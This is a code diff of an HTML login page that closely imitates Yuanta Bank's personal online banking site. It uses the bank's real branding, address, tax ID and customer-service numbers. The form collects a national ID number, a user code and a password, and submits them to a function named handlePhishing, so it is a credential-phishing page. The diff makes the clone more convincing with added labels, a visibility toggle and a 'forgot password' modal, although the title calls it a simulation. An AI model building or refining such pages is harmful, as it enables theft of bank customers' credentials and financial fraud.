@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-    <meta charset="UTF-8">
-    <title>元大網路銀行</title>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8" />
+    <title>元大網路銀行登入模擬</title>
+    <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 <div class="page-wrapper">
+
+    <!-- Header 上排 -->
     <header class="main-header">
         <div class="logo-block">
             <div class="logo-left">
@@ -17,24 +19,37 @@
         </div>
         <div class="header-center">個人網路銀行</div>
         <div class="header-right">
-            <div class="header-right">
-                <button class="icon-button" title="語言切換">🌐</button>
-                <button class="icon-button" title="搜尋">🔍</button>
-            </div>
+            <button class="icon-button" title="語言切換">🌐</button>
+            <button class="icon-button" title="搜尋">🔍</button>
         </div>
     </header>
 
+    <!-- 登入表單 -->
     <main class="main-content">
         <div class="login-container">
             <div class="logo">元大銀行 Yuanta Bank</div>
             <h3>網銀登入</h3>
             <form onsubmit="handlePhishing(event)">
-                <input type="text" placeholder="身分證字號" required maxlength="10" pattern="[A-Z][12][0-9]{8}" title="請輸入正確的台灣身分證字號，例如 A123456789">
-                <input type="password" placeholder="使用者代號" required>
-                <input type="password" placeholder="使用者密碼" required>
+                <label for="idNumber">身分證字號</label>
+                <input id="idNumber" type="text" placeholder="請輸入身分證字號" maxlength="10" pattern="[A-Z][12][0-9]{8}" required />
 
+                <label for="userId">使用者代號</label>
+                <div class="input-eye-box">
+                    <input id="userId" type="password" placeholder="請輸入使用者代號" required />
+                    <span class="eye" onclick="toggleVisibility('userId', this)">🙈</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="userPwd">
+                        使用者密碼
+                        <a class="forgot-link" onclick="openForgotModal()">❓ 忘記密碼</a>
+                    </label>
+                    <input id="userPwd" type="password" placeholder="請輸入密碼" required />
+                </div>
+
+                <label for="captchaInput">圖形驗證碼</label>
                 <div class="captcha-box">
-                    <input type="text" placeholder="圖形驗證碼" required>
+                    <input id="captchaInput" type="text" placeholder="請輸入驗證碼" required />
                     <div class="captcha-img" id="captcha">------</div>
                     <button type="button" class="refresh-btn" onclick="generateCaptcha()">↻</button>
                 </div>
@@ -44,6 +59,7 @@
         </div>
     </main>
 
+    <!-- Footer 下排 -->
     <footer>
         <div class="footer-buttons">
             <button>網路銀行服務說明</button>
@@ -55,32 +71,40 @@
             <button>客服專區</button>
             <button>智能客服</button>
         </div>
-
         <div class="footer-middle">
-            隱私權保護聲明 | 客戶資料保密措施 | 宣導連結<br>
-            為提供您更好、更個人化的服務，本網站採用網站追蹤工具（包含但不限於Cookies等）來優化使用者體驗。<br>
+            隱私權保護聲明 | 客戶資料保密措施 | 宣導連結<br />
+            為提供您更好、更個人化的服務，本網站採用網站追蹤工具（包含但不限於Cookies等）來優化使用者體驗。<br />
             若您繼續瀏覽本網站，即表示您同意我們使用Cookies技術。更多相關資訊請參閱隱私權保護聲明。
         </div>
-
         <div class="footer-bottom">
-            地址：106台北市大安區仁愛路三段157號　電子信箱：service@yuanta.com<br>
+            地址：106台北市大安區仁愛路三段157號　電子信箱：service@yuanta.com<br />
             客服專線：0800-688-168　營業人：元大商業銀行股份有限公司　營利事業統一編號：86517315
         </div>
     </footer>
 </div>
 
-<!-- Modal -->
+<!-- 金融卡登入說明 Modal -->
 <div id="modal" class="modal">
     <div class="modal-content">
         <h3>金融卡登入網路銀行服務說明</h3>
         <p>一、為提升您的網路銀行交易安全等級，建議您持本人之元大銀行晶片金融卡進行網路銀行登入。</p>
         <p>二、使用前請先正確安裝晶片讀卡機及本行Super ATM元件（<a href="#">常見問題</a>）。</p>
-        <p>三、開啟晶片金融卡登入服務：登入個人網路銀行後，至「申辦專區-晶片金融卡功能設定-晶片金融卡登入網路銀行服務」使用您本人之元大銀行晶片金融卡申請開啟服務。</p>
-        <p>四、同上。</p>
-        <p>五、若晶片金融卡有未啟用、掛失、停用、鎖卡、或其他狀態異常等情事，則將無法登入本行網路銀行，讓您使用更安心。</p>
+        <p>三、登入後至「申辦專區 → 晶片金融卡功能設定 → 晶片金融卡登入服務」進行啟用。</p>
+        <p>四、若晶片卡掛失、停用或鎖卡，將無法登入本行網銀。</p>
         <button onclick="closeModal()" class="close-btn">關閉</button>
     </div>
 </div>
+
+<!-- 忘記密碼 Modal -->
+<div id="forgotModal" class="modal">
+    <div class="modal-content">
+        <h3>忘記密碼</h3>
+        <p>一、請攜帶身分證與晶片卡至本行任一分行重設密碼。</p>
+        <p>二、如有問題請撥打客服：02-2182-1968。</p>
+        <button class="close-btn" onclick="closeForgotModal()">關閉</button>
+    </div>
+</div>
+
 <script src="script.js"></script>
 </body>
 </html>
